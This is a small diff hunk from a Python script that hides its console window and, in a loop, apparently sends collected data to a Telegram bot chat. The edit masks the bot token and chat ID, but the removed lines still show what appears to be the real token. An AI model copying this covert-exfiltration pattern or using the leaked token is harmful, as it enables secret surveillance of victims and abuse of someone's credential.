@@ -14,11 +14,11 @@ hide_console()
 print("start")
 
 # Your Telegram bot token
-token = "7407307145:AAFeUdlLZbdFnWl7WMYmbasRCFebidRqXjg"
+token = "740730xxxxxxxxxxxxxxxxxxx"
 url = f"https://api.telegram.org/bot{token}/sendMessage"
 
 # Chat ID to send the messages to
-chat_id = "1453451211"
+chat_id = "145xxxxxxxxxxx"
 
 data = ""
 while True:
